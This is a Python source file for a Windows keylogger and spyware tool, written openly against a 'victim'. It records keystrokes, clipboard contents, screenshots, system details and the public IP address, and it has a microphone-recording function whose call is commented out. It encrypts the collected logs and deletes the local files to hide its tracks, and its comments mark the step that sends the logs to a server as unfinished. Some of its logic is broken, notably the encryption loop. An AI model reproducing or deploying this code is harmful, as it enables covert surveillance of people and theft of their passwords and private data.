# Libraries
from datetime import datetime  # Import datetime module

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
# Libraries to handle emaill side of keylogger

import socket 
import platform
# Libraries used to collect computer information 

import win32clipboard
#Libraries used to collect clipboard data

from pynput.keyboard import Key, Listener
#Libraries used to grab keystrokes

import time
import os
#Libraries use to track the time pass using system information

from scipy.io.wavfile import write
import sounddevice as sd
#Libraries used for microphone access

from cryptography.fernet import Fernet
#Libraries used to encript files 

import getpass
from requests import get
#Libraries used for getting the ussername and collecting more computer information 


from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import logging 
#Libaraies used for screenshot functionality 


# Default Variables 
file_path = ' '   # The file path where you want your files to be save locally 
extend = "\\"
file_merge = file_path + extend
key = " "  # # Generate an encryption key from the Cryptography folder 

keys_information =  "key_log.txt"         #Stored Keylog Files
system_information = "systeminfo.txt"     #Stored System info Files
clipboard_info = "Clipboard.txt"          #Stored Clipboard files
microphone_time = 10                      #Time in seconds of recording recorded
audio_information = "audio.wav"           #Stored Audio Files
screenshot_information = "screenshoot.png"
time_iteration = 15
number_of_iterations_end = 3

#Encrypted Files
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_info_e = "e_Clipboard.txt"



# Function for Acquiring victim's Computer information 
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:

            public_ip = get("https://api.ipify.org").text
            f.write ("Public IP Address: " + public_ip +'\n')
        
        except Exception:
            f.write("Couldn't get Public IP Address (most likley max query)" )

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr +"\n")

computer_information()

# Function for copying victim's Clipboard information 
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")

copy_clipboard()

# Function for Recording victim's Computer Audio
def microphone():
    hertz = 44100
    
    sec = microphone_time

    myrecording = sd.rec(int(sec * hertz), samplerate=hertz, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, hertz,myrecording)

#microphone()

# Function to Screenshot Victim's PC
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0 
currentTime = time.time()
stoppingTime = time.time() + time_iteration
 
#Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0 
    keys = []


    # Define the function that logs the keys 
    def on_press(key):
        global keys, count,currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
    
        if count >= 1:
            count = 0 
            write_file(keys)
            keys = []


    #Define the function that writes Keylogs to the txt document      
    def write_file(keys):
        with open(file_path + extend + keys_information, 'a') as f:
            for key in keys:
                
                # Get the current date and time
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S, %f')[:-3]
            
                # Convert the key to a string and remove any single quotes
                k = str(key).replace("'", "")
                
                f.write(f"{current_time}:'{k}'\n")           


    def on_release(key) :
        if keys == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False
    
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Timer Functionality 
    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        # do a script here to send the screenshoot to the server because the emailing metheod no longer works IMPORTANT!!!

        copy_clipboard()

        number_of_iterations += 1

        currentTime =time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt Files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_info, file_merge + keys_information ]
encrypted_files_names = [file_merge + system_information_e, file_merge + clipboard_info_e, file_merge + keys_information_e]


count = 0 

for encrypting_files in files_to_encrypt:
    with open(files_to_encrypt [count], 'rb') as f:
        data = f.read()


fernet = Fernet(key)
encrypted = fernet.encrypt(data)

with open(encrypted_files_names[count], "wb" ) as f:
    f.write(encrypted)


#Do a send information to server part here so i can send the encrypted logs to the server  IMPORTANT!!!

time.sleep(120) #let the function sleep 


#Clean up our tracks and delete files
delete_files = [system_information,clipboard_info,keys_information,screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge +file)



